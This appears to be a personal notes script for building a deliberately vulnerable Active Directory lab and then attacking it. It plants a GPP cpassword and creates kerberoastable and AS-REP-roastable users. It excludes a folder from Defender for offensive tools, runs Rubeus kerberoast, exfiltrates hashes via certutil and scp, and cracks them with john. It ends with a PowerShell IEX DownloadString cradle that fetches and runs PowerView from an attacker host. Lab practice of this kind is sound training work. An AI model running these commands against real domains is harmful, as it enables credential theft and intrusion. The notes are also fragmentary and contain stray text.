```powershell
#Make sure you set a Static IP

#Make sure you set the Hostname with a perminant Name

  

Add-WindowsFeature ad-domain-services

  

$SecPass = ConvertTo-SecureString -String NoOneCanGuessMySecretPass1@! -AsPlainText -force

  

Install-ADDSForest -DomainName heckintechin.tech -InstallDns -DomainNetbiosName heckin -SafeModeAdministratorPassword $SecPass -Force

  

#Restart will Occur

  

Add-WindowsFeature -name rsat-adds

  

#ADDS Users and Computers

  

dsa.msc

  

#Open Group Policy Mgmt

#Look at Pass Policy

#Then adjust the Pass Policy to be WEAK

  

Set-ADDefaultDomainPasswordPolicy -Identity heckintechin.tech  -LockoutThreshold 15 -LockoutDuration 00:03:00 -LockoutObservationWindow 00:02:00 -ComplexityEnabled $false -MaxPasswordAge 42.00:00:00 -MinPasswordAge 1.00:00:00 -MinPasswordLength 5 -PasswordHistoryCount 27

  

#Also Make the password complex for later testing to mimic actual AD in your Environment Though lockout is low and hight so your cracker can run Adjust LockThresh and LockDuration to be closer to your policy.

  

Set-ADDefaultDomainPasswordPolicy -Identity heckintechin.tech  -LockoutThreshold 15 -LockoutDuration 00:03:00 -LockoutObservationWindow 00:02:00 -ComplexityEnabled $true -MaxPasswordAge 90.00:00:00 -MinPasswordAge 7.00:00:00 -MinPasswordLength 12 -PasswordHistoryCount 12

  

#MS14-025 Vuln Creation

  

#Create a new GPO called Global Local Admin

#Right click > Edit

#Go to Users > Prefrences > Control Panel > Local users & Comp

#Right click area and add new user > GloabalLocalAdmin > FullName: Global .L Admin > Description: Global Local Admin on all workstations SMH!

#Go back to GPMgmt > details > UID copy > open cmd as admin {3A399

  

cd  C:\Windows\SYSVOL\domain\Policies

dir

cd ".\{3A399284-3C88-49FB-89E7-D773C7E3D5A4}"

dir

cd user

dir

cd .\Preferences

dir

cd .\Groups

dir

notepad Groups.xml

cpassword="" #use to be encrypted and the key got published by MSFT and was the same on every AD pass

#This means that you can find groups.xml and if you see cspassword="a;ldkjaf;ljadfjsd;l" then you can decrypt them.

  
  

#install ubuntu > then Go for linux, Then install cosign> then Saltstack cast > then SIFT

  
  
  

#enable RDP on Ubuntu

  

#git clone the gp3finder > run setup.py install

  

#place pass in xml doc

  

#SSH to Pentest box

ssh user@0.0.0.0

  

cd /opt/

ls g*

cd gpppfinder

ls

  

clear

  

https://bitbucket.org/grimhacker/gpppfinder/src/master/

gp3finder

  

#Encrypt Password to CPASSWORD Value

gp3finder -E MySecretPass

  

#If you find one then you can Decrypt this vlaue

sudo gp3finder -D <Encrypted_Value>

  

#paste encrypted pass into the Groups.xml file and save

  

#use PingCastle then show were AD is bleeding at the seems. Download it https://www.pingcastle.com/download/

  

#============================

  

#Check Windows Version

  

#win+r

  

winver

  

#install python and then reload your powershell windows or cmd windows

  

#install faker

  

pip3 install faker

  

#had to install gpg and then vscode > then create youzer.py and change the the import of faker

  

$ sudo python youzer.py --generate --generate_length 6 --ou "ou=Contractors,dc=heckintechin,dc=tech" --domain heckintechin.tech --users 10000 --output heckinlusers.csv

  

# Need to install faker in the opt directory with root priv

  

# Spin up a pyserver from the current directory

  

sudo python3 -m http.server 80

  

#Copy files down to the DC and move your pwsh session to the directory

  

cd Downloads

  

Set-ExecutionPolicy bypass

  

# Create the OU you used in the youzer cli cmd.

  

# Run teh youzer ps1 script

  

#https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/#:~:text=AS%2DREP%20Roasting%20is%20a,then%20attempt%20to%20crack%20offline

  

# Set Defender exlude file on Desktop

  

# Place files from https://github.com/Flangvik/SharpCollection in that excluded folder

  

#Pick a user and add comments in the users name Problem with account on 2/2/23 - changed password to TonyWantWingy

  

# Create a rep roastable user by making another ps1 file and running the below commands in order NOT all at once

  

New-ADUser —Name "Kerba Roastable" -GivenName "Kerba" -Surname "Roastable" -SamAccountName Kerba -Description "ROASTED!" -Path "OU=Contractors,DC=heckintechin,DC=tech" -AccountPassword (ConvertTo-SecureString "Password1" -AsPlainText -force) -passthru -PasswordNeverExpires $true -Enabled $true

Enable-ADAccount Kerba

setspn -a IIS_SITE/heckintechindc1.heckintechin.tech:77777 Kerba

  

#check your spn was set

  

setspn -Q */* | findstr IIS

  

#powershell not recognizing New-ADUser so reinstall all subfeatures

  

Install-WindowsFeature -Name “RSAT-AD-PowerShell” -IncludeAllSubFeature

  

Get-Module -Name ActiveDirectory -ListAvailable

  

Import-Module -Name ActiveDirectory

  

(Get-Module -Name ActiveDirectory).ExportedCommands | ft Key

  

#make a user reproastable > go to ADUC select a user > Joe Jenkins > check do not require kerberos preauthentication

  

#rerun above code make sure the ADUser is cap

  

cd Desktop\notmalware

dir

start .

  
  

#unzip

cd SharpCollection-master\SharpCollection-master

dir

cd NetFramework_4.7_Any

  

ADCollector.exe

  

ADCollector.exe > ad.txt

  

notepad ad.txt

  

# Look for Description adcollector and finds pass you can set other params for things to look for pass, password, password:, pw:, token, key:

# can look in other form fields for passwords as well.

#also can run ldapdomaindump https://github.com/dirkjanm/ldapdomaindump

  

grep -i pass users.json #can also use jq need to get that installed to parse json better

  

#pull down hashes for the kerberoastable user

  

Rubeus.exe kerberoast /nowrap

  

Rubeus.exe kerberoast /nowrap /outfile:asrep.txt

  

#nowrap is bc john or hashcat will get upset

  

#Now exfil the docs to the cracker https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65

#https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/

#Onto ^^^^^^

  

#certutil -urlcache -split -f "http:// ip-addr : port / file " [ output-file ]

  

certutil -urlcache -split -f "http://192.168.0.24:8000/ "

  

#Exfil off DC https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/

#I chose to use SCP https://www.youtube.com/watch?v=XiZQa-QXuoU

#setup SCP on win and then setup ssh-client and ssh-server on linux SIFT

  

scp -r hashfiles hack3dlazy@192.168.0.24:/tmp # from the DC or win host

  

john <your hash file> ––wordlist=wordlist.txt ––format=krb5tgs

  

john asrep.txt --wordlist=/usr/share/wordlists/SecLists/Passwords/500-worst-passwords.txt --format=krb5tgs

  

#Need to install john the jumbo edition https://openwall.info/wiki/john/tutorials/Ubuntu-build-howto

# Needs tweaking from the Above ^^^^ https://www.youtube.com/watch?v=KzD1xxVt4cg

  

hashcat | grep NTLM

hashcat | grep kerberos

  

1046ica

  

#You can use powerview.ps1 PowerShell script to perform kerberoasting and you can have output in hashcat supported format.

  

#Below mentioned command will download and execute PowerView PowerShell script on target machine. Output will be in file with name kerb-Hash.txt

  

powershell.exe -ep bypass -c "IEX (New-Object

System.Net.WebClient).DownloadString('http://your_ip/powerview.ps1') ;

Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash

| out-file -Encoding ASCII kerb-Hash.txt"
```
